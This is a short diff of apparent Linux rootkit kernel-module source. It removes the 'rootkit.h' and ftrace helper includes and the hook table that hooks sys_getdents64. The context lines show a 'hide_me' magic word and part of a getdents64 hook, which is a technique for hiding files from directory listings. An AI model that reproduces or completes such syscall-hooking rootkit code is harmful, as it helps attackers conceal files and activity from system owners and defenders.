@@ -8,11 +8,6 @@
 #include <linux/proc_ns.h>
 
 
-#include "stdlib.h"
-#include "rootkit.h"
-#include "ftrace_helper.h"
-
-
 char* MAGIC_WORD = "hide_me";
 
 
@@ -107,8 +102,3 @@ static asmlinkage int hook_sys_getdents64(unsigned int fd, struct linux_dirent _
     return res;
 }
 #endif
-
-
-static struct ftrace_hook syscall_hooks[] = {
-    HOOK("sys_getdents64", hook_sys_getdents64, &orig_sys_getdents64),
-};
